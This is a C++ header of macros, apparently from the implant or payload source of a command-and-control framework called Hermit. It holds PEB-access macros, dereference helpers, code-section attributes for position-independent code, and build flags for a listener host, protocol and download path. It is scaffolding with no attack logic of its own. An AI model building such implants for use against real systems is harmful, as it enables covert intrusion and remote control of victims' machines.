#ifndef HERMIT_CORE_MACROS_HPP
#define HERMIT_CORE_MACROS_HPP

// PEB
#ifdef _WIN64
#define PPEB_PTR __readgsqword(0x60)
#else
#define PPEB_PTR __readfsqword(0x30)
#endif

// FUNCTIONS
#define DEREF(name)     *(UINT_PTR*)(name)
#define DEREF_64(name)  *(DWORD64*)(name)
#define DEREF_32(name)  *(DWORD*)(name)
#define DEREF_16(name)  *(WORD*)(name)
#define DEREF_8(name)   *(BYTE*)(name)

#define SEC(s, x) __attribute__((section("." #s "$" #x "")))

#define MEMCPY    __builtin_memcpy

#ifndef TO_LOWERCASE
#define TO_LOWERCASE(c1, out) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
#endif

#define WIDEN(x) WIDEN2(x)
#define WIDEN2(x) L##x

// PAYLOAD FLAGS
#ifdef LISTENER_PROTOCOL
#define LISTENER_PROTOCOL_W WIDEN(LISTENER_PROTOCOL)
#endif

#ifdef LISTENER_HOST
#define LISTENER_HOST_W WIDEN(LISTENER_HOST)
#endif

#ifdef REQUEST_PATH_DOWNLOAD
#define REQUEST_PATH_DOWNLOAD_W WIDEN(REQUEST_PATH_DOWNLOAD)
#endif

#endif // HERMIT_CORE_MACROS_HPP